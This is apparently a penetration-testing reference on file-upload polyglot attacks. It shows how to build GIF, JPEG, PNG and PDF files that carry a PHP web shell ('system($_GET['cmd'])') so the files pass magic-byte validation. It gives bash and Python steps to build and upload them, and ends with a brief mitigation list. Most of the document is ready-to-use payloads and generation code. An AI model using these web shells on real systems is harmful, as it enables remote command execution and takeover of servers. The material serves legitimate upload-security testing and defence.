# File Upload Polyglot Files

## Overview
- Purpose: Create and test polyglot files that are simultaneously valid in multiple file formats
- Category: web_security
- Severity: high
- Tags: file-upload, polyglot, bypass, magic-bytes, OWASP-A4

## Context and Use-Cases
- Polyglot files can bypass file type validation by appearing as one format while containing executable code
- Useful for bypassing MIME type and magic byte validation
- Can be executed if the server processes the embedded code
- Common in advanced file upload vulnerability testing

## Polyglot File Types

### 1. Image + PHP Polyglot
**Format:** GIF/JPEG/PNG with embedded PHP code

**GIF89a + PHP Example:**
```
GIF89a<?php system($_GET['cmd']); ?>
```

**How it works:**
- Starts with GIF89a header (magic bytes: `47 49 46 38 39 61`)
- Followed by PHP code
- Passes GIF validation (magic bytes check)
- If uploaded to web-accessible directory with PHP execution enabled, PHP code executes

**Creation:**
```bash
printf '\x47\x49\x46\x38\x39\x61' > polyglot.gif
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.gif
```

### 2. JPEG + PHP Polyglot
**Format:** JPEG with embedded PHP

**JPEG Header:**
```
FF D8 FF E0 00 10 4A 46 49 46 00 01
```

**Creation:**
```bash
# Create minimal JPEG header
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > polyglot.jpg
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.jpg
printf '\xFF\xD9' >> polyglot.jpg  # JPEG end marker
```

### 3. PNG + PHP Polyglot
**Format:** PNG with embedded PHP

**PNG Header:**
```
89 50 4E 47 0D 0A 1A 0A
```

**Creation:**
```bash
printf '\x89PNG\r\n\x1a\n' > polyglot.png
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.png
```

### 4. PDF + PHP Polyglot
**Format:** PDF with embedded PHP

**PDF Header:**
```
%PDF-1.4
```

**Creation:**
```bash
echo '%PDF-1.4' > polyglot.pdf
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.pdf
```

## Examples

### Image Polyglot Test File
```python
# From FileUploadTesting.py
{
    "name": "polyglot.jpg",
    "content": "GIF89a<?php system($_GET['cmd']); ?>",
    "technique": "image_polyglot"
}
```

### Testing Polyglot Files
```python
def create_polyglot_file(file_type: str, payload: str) -> bytes:
    """Create polyglot file with magic bytes and payload"""

    magic_bytes = {
        'gif': b'\x47\x49\x46\x38\x39\x61',  # GIF89a
        'jpeg': b'\xFF\xD8\xFF\xE0',          # JPEG SOI + APP0
        'png': b'\x89PNG\r\n\x1a\n',          # PNG signature
        'pdf': b'%PDF-1.4\n'                  # PDF header
    }

    return magic_bytes.get(file_type, b'') + payload.encode()

# Create and upload polyglot
polyglot = create_polyglot_file('gif', '<?php system($_GET["cmd"]); ?>')
response = upload_file('polyglot.jpg', polyglot)
```

### Verification
```bash
# Check file type
file polyglot.jpg
# Output: polyglot.jpg: GIF image data, version 89a

# But contains PHP code
strings polyglot.jpg | grep php
# Output: <?php system($_GET['cmd']); ?>
```

## Detection and Mitigation
- Validate file content thoroughly, not just magic bytes
- Use dedicated file parsing libraries to verify file integrity
- Scan files with antivirus/malware detection tools
- Disable script execution in upload directories
- Use Content-Disposition: attachment header
- Store uploads outside web root
- Implement strict access controls
- Monitor for suspicious file access patterns
